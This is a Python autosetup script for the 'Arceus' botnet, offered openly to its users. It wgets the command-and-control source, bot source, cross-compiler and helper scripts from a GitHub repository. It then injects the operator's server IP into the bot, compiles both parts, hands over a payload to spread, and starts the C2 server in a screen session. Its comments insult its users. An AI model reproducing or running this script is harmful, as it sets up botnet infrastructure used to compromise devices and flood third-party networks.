# Setup By Georgia Cri / FlexingOnLamers
import subprocess, time

def Arceus(cmd):
    subprocess.call(cmd, shell=True)
def Cri(file_name, line_num, text):
  lines = open(file_name, 'r').readlines()
  lines[line_num] = text
  out = open(file_name, 'w')
  out.writelines(lines)
  out.close()

# Well ladies and retards, since none of you know how to setup my bOtNeT bc your retarded, heres an autosetup
#///////////////////////
# Colors and such
dred = "\x1b[0;31m"
dblue = "\x1b[0;34m"
dcyan = "\x1b[0;36m"
red = "\x1b[1;31m"
blue = "\x1b[1;34m"
cyan = "\x1b[1;36m"
white = "\x1b[1;37m"
#///////////////////////
# File Paths
IPHM = "scripts/"
#///////////////////////
print(""+ white +"Credits:")
time.sleep(1)
print(""+ white +"AutoSetup Developer: "+ red +"Georgia Cri "+ white +"/ "+ red +"FlexingOnLamers "+ cyan +"#RIPKatura")
time.sleep(1)
print(""+ white +"Arceus I Developers: "+ cyan +"@"+ red +"FlexingOnLamers "+ white +"and "+ cyan +"@"+ red +"Transmissional")
time.sleep(1)
print(""+ white +"IPLookup Api: "+ red +"N/A")
time.sleep(1)
print(""+ white +"Domain Resolver: "+ red +"Snickers")
time.sleep(1)
print(""+ white +"Installing Needed "+ red +"Dependencies "+ white +"And "+ red +"Packages "+ white +"before setting up..")
time.sleep(3)
#///////////////////////
# Dependency Installation
#Arceus("yum update -y")
#Arceus("yum install python-paramiko gcc screen nano wget httpd iptables perl php php-pear -y")
#Arceus("yum install gcc cmake gmp gmp-devel libpcap-devel gengetopt byacc flex -y")
#Arceus("yum install json-c-doc.noarch json-c.i686 json-c.x86_64 json-c-devel.i686 json-c-devel.x86_64 -y")
#Arceus("yum install epel-release -y")
#Arceus("yum install gengetopt -y")
#Arceus("yum install bzip2 -y")
#Arceus("yum install lbzip2 -y")
#Arceus("clear")
#///////////////////////
#print(""+ red +"Finished!")
#time.sleep(2)
#///////////////////////
# Server ULIMIT Setup
print("Now setting Server ULIMIT and Downloading All files.")
Arceus("ulimit -n 999999")
print(""+ red +"Finished!")
time.sleep(2)
Arceus("clear")
#///////////////////////
print(""+ white +"Now im gonna need to collect a few things from you..")
time.sleep(2)
# User input (We are using this to replace said information inside of the Bot, C2Base)
username = raw_input(""+ white +"Enter Desired Username:"+ red +" ")
password = raw_input(""+ white +"Enter Desired Password:"+ red +" ")
print(""+ white +"Setting Up User: "+ red +"["+ white +""+ username +""+ red +"] "+ white +"With "+ cyan +"Administrator "+ white +"Account!")
Arceus("echo "+ username +" "+ password +" admin >> arceus.txt")
IP = raw_input(""+ white +"Enter Your Servers IP:"+ red +" ")
threads = raw_input(""+ white +"Enter Desired Threads to screen on:"+ red +" ")
cport = raw_input(""+ white +"Enter your desired Connection Port:"+ red +" ")
#///////////////////////
print("Now, lets setup our directiories")
print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"logs"+ white +"/"+ red +"]")
time.sleep(1)
print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
time.sleep(1)
print(""+ white +"Creating Directory: "+ red +"["+ white +"/"+ red +"root"+ white +"/"+ red +"amp"+ white +"/"+ red +"]")
Arceus("mkdir logs amp scripts")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"K, now lets download everything")
print(""+ white +"Downloading "+ red +"Arceus I Alpha..")
Arceus("wget -q https://raw.githubusercontent.com/virtualsociopath/Arceus/master/Main/c2.c -O c2.c")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"Arceus I Bot")
Arceus("wget -q https://raw.githubusercontent.com/virtualsociopath/Arceus/master/Autosetup/bot.c -O bot.c")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"Arceus I Cross-Compiler")
Arceus("wget -q https://raw.githubusercontent.com/virtualsociopath/Arceus/master/Main/Arceus.py -O Arceus.py")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"Resolver Header")
Arceus("wget -q https://raw.githubusercontent.com/virtualsociopath/Arceus/master/Main/resolver.h -O resolver.h")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"IPHM Scanner Process Killer")
Arceus("wget -q https://raw.githubusercontent.com/virtualsociopath/Arceus/master/Main/scripts/IPHM_Scanner_Process_Killerv2.py -O IPHM_Scanner_Process_Killerv2.py")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"IPHM Attack process killer")
Arceus("wget -q https://raw.githubusercontent.com/virtualsociopath/Arceus/master/Main/scripts/IPHM_Attack_Process_Killerv2.py -O IPHM_Attack_Process_Killerv2.py")
time.sleep(2)
print(""+ red +"Finished!")
print(""+ white +"Downloading "+ red +"IPLookup API")
Arceus("wget -q https://raw.githubusercontent.com/virtualsociopath/Arceus/master/Main/iplookup.php -O iplookup.php")
time.sleep(2)
print(""+ red +"Finished!")
time.sleep(2)
Arceus("clear")
print(""+ white +"Now lets replace the needed information inside of the "+ red +"Bot")
print(""+ white +"Replacing "+ red +"IP "+ white +"And "+ red +"BotPort inside of the Bot")
Cri('bot.c', 182, 'unsigned char *Arceus[] = {"'+ IP +':666"}; // <ServerIP>:<BotPort>\n')
time.sleep(2)
print(""+ red +"Finished!")
time.sleep(2)
Arceus("clear")
print(""+ white +"Now lets compile our C2 and BOT")
comp = raw_input("Would you like to remove the raw .c file for the c2 after compiling? (y/n):")

if comp == "y" or "Y":
    Arceus("gcc -o c2 c2.c -pthread")
    Arceus("rm -rf c2.c")
elif comp == "n" or "N":
    Arceus("gcc -o c2 c2.c -pthread")

print(""+ white +"Finished Compiling "+ red +"C2, "+ white +"time to compile our "+ red +"bot"+ white +"!")
time.sleep(2)
Arceus("python Arceus.py bot.c "+ IP +"")
print("Make sure to copy your payload, im giving you 10 seconds "+ red +"<3")
time.sleep(10)
Arceus("clear")
print(""+ white +"Now that our directories are setup and our bots compiled, lets go ahead and move our files")
print(""+ white +"Now lets move our needed files into the correct directories")
time.sleep(2)
print(""+ white +"Moving Script: "+ red +"["+ white +"IPHM_Attack_Process_Killerv2.py"+ red +"] "+ white +"To Directory: "+ red +"["+white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
time.sleep(1)
print(""+ white +"Moving Script: "+ red +"["+ white +"IPHM_Scanner_Process_Killerv2.py"+ red +"] "+ white +"To Directory: "+ red +"["+white +"/"+ red +"root"+ white +"/"+ red +"scripts"+ white +"/"+ red +"]")
time.sleep(1)
print(""+ white +"Moving Script: "+ red +"["+ white +"iplookup.php"+ red +"] "+ white +"To Directory: "+ red +"["+ white +"/"+ red +"var"+ white +"/"+ red +"www"+ white +"/"+ red +"html"+ white +"/"+ red +"]")
Arceus("mv IPHM_Attack_Process_Killerv2.py "+ IPHM +"")
Arceus("mv IPHM_Scanner_Process_Killerv2.py "+ IPHM +"")
Arceus("mv iplookup.php /var/www/html/")
time.sleep(2)
print(""+ red +"Finished!")
cleanup = raw_input("Would you like to clean the server and get rid of all extra files? (y/n): ")

if cleanup == "y" or "Y":
    Arceus("rm -rf Arceus.py")
    Arceus("mkdir Cross-Compilers")
    Arceus("mv cross-compiler-* Cross-Compilers/")
    print(""+ red +"Continuing!")
elif cleanup == "n" or "N":
    print(""+ red +"Continuing!")

print(""+ white +"Now we're done! lets screen and connect.")
Arceus("screen -dm ./c2 666 "+ threads +" "+ cport +"")
print(""+ white +"Its up! Information below!")
print(""+ white +"IP: "+ red +"["+ white +""+ IP +""+ red +"] "+ white +"Connection Port: "+ red +"["+ white +""+ cport +""+ red +"] "+ white +"BotPort: "+ red +"["+ white +"666"+ red +"] "+ white +"Type: "+ red +"["+ white +"Raw"+ red +"]")
